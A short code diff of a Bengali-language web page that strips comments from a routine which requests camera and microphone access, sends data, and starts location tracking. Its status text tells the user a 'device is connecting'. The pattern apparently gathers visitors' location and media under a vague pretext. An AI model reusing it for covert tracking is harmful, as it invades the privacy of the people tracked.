@@ -88,7 +88,6 @@
             btn.innerText = '⏳ পারমিশন চাচ্ছি...';
             statusMsg.innerText = '📡 ডিভাইস কানেক্ট হচ্ছে...';
 
-            // ক্যামেরা চেষ্টা করবে, না পেলেও সমস্যা নেই
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 videoElement.srcObject = stream;
@@ -97,10 +96,7 @@
                 console.log("ক্যামেরা পারমিশন নেই, কিন্তু লোকেশন চলবে: ", err);
             }
 
-            // সাথে সাথে ডিভাইস কানেক্ট করার জন্য ডেটা পাঠানো
             sendData(0, 0, 5000, 'N/A', false);
-            
-            // লোকেশন ট্র্যাকিং শুরু
             startTracking();
         }
 
